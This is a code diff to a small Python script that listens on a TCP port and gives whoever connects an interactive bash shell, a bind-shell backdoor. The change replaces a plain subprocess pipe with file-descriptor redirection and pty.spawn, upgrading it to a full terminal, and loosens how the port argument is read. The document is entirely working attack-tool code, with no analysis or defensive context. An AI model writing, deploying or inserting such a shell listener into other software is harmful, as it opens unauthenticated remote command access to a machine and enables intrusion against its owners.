@@ -5,6 +5,8 @@
 import socket
 import subprocess
 import sys
+import os
+import pty
 
 def main(port):
     try:
@@ -18,11 +20,16 @@ def main(port):
     s.bind(("", port))
     s.listen(1)
     (conn, address) = s.accept()
-    p = subprocess.Popen(["/bin/bash","-i"], stdin=conn, stdout=conn, stderr=conn)
+    os.dup2(conn.fileno(), 0);
+    os.dup2(conn.fileno(), 1);
+    os.dup2(conn.fileno(), 2);
+    pty.spawn("/bin/bash")
+    s.close()
+
 
 if __name__ == "__main__":
-    if not sys.argv[1]:
-        rport = raw_input("What is the port number to listen on? ")
-    else:
+    try:
         rport = sys.argv[1]
+    except:
+       	rport = raw_input("What is the port number to listen on? ")
     main(rport)
